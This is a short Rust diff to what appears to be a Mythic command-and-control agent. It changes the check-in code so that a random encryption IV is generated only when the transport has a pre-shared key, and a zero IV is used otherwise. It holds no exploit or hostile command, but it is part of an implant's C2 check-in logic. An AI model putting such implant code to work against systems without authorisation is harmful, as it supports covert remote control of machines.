@@ -106,10 +106,18 @@ impl MythicAgent {
             self.trace_json_sent = Some(json);
         }
 
-        let iv = c2.random_iv().map_err(MythicError::transport)?;
-        if self.debug {
-            self.trace_iv_hex = Some(hex_fmt(&iv));
-        }
+        // Only generate an IV when the transport provides a PSK.
+        // Plaintext transports can skip the RNG call entirely.
+        let needs_crypto = c2.aes_psk().is_some();
+        let iv = if needs_crypto {
+            let iv = c2.random_iv().map_err(MythicError::transport)?;
+            if self.debug {
+                self.trace_iv_hex = Some(hex_fmt(&iv));
+            }
+            iv
+        } else {
+            [0u8; 16]
+        };
 
         let DirectResult { callback_uuid, crypto, packet_sent, packet_received } =
             checkin::direct_checkin(c2, &req, payload_uuid, &iv)?;
